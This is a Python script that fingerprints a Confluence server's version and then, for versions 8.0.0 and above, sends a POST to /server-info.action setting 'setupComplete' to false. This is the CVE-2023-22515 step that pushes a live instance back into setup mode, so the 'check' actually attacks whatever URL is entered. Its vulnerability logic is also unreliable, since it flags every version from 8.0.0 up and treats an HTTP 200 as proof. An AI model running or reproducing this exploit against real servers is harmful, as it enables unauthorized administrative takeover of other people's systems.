import requests
import re
from packaging import version

# Function to get user input for URL
def get_user_input():
    url = input("Enter the URL of the Confluence instance (e.g., http://example.com): ")
    if not url.startswith("http"):
        url = "http://" + url
    return url

# Function to check the Confluence version
def check_version(url):
    version_url = f'{url}/login.action'
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'X-Custom-Header': 'your-personal-identifier'
    }

    response = requests.get(version_url, headers=headers)

    if response.status_code == 200:
        version_pattern = re.compile(r'Confluence ([0-9]+\.[0-9]+\.[0-9]+)')
        match = version_pattern.search(response.text)
        if match:
            detected_version = match.group(1)
            print(f"Confluence version detected: {detected_version}")
            return detected_version
        else:
            print("Failed to detect Confluence version.")
            return None
    else:
        print("Failed to access the Confluence login page.")
        return None

# Function to compare versions
def is_vulnerable(detected_version):
    vulnerable_version = "8.0.0"
    return version.parse(detected_version) >= version.parse(vulnerable_version)

# Function to check if setup mode can be triggered
def check_setup_mode(url):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'X-Custom-Header': 'your-username'
    }
    setup_mode_url = f'{url}/server-info.action'
    payload = {
        'bootstrapStatusProvider.applicationConfig.setupComplete': 'false'
    }

    response = requests.post(setup_mode_url, headers=headers, data=payload)

    if response.status_code == 200:
        print('The application can be set to setup mode, indicating vulnerability to CVE-2023-22515.')
    else:
        print('Failed to set the application to setup mode.')

if __name__ == "__main__":
    target_url = get_user_input()
    detected_version = check_version(target_url)
    if detected_version and is_vulnerable(detected_version):
        check_setup_mode(target_url)
    else:
        print("The Confluence instance is not vulnerable to CVE-2023-22515.")
